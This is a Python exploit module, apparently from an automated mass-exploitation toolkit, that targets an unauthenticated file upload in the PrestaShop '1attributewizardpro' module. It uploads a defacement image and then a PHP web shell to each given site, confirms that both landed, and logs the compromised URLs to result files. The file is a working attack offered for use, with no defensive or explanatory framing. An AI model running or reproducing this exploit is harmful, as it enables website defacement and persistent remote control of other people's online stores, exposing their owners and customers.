# coding=utf-8
import requests
from Exploits import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
Jce_Deface_image = 'files/pwn.gif'
ShellPresta = 'files/up.php'


def Exploit(site):
    try:
        Exp = site + '/modules/1attributewizardpro/file_upload.php'
        FileDataIndex = {'userfile': open(Jce_Deface_image, 'rb')}
        FileDataShell = {'userfile': open(ShellPresta, 'rb')}
        GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=Headers)
        if Jce_Deface_image.split('/')[1] in str(GoT.content):
            Index = str(GoT.content).split('|||')[0]
            IndexPath = site + '/modules/1attributewizardpro/file_uploads/' + Index
            CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=Headers)
            if 'GIF89a' in str(CheckIndex.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(IndexPath + '\n')
                Got2 = requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=Headers)
                if ShellPresta.split('/')[1] in str(GoT.content):
                    Shell = str(Got2.content).split('|||')[0]
                    ShellPath = site + '/modules/1attributewizardpro/file_uploads/' + Shell
                    CheckShell = requests.get('http://' + ShellPath, timeout=5, headers=Headers)
                    if 'Vuln!!' in str(CheckShell.content):
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                return printModule.returnYes(site, 'N/A', '1attributewizardpro Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', '1attributewizardpro Module', 'Prestashop')
        else:
            return printModule.returnNo(site, 'N/A', '1attributewizardpro Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', '1attributewizardpro Module', 'Prestashop')
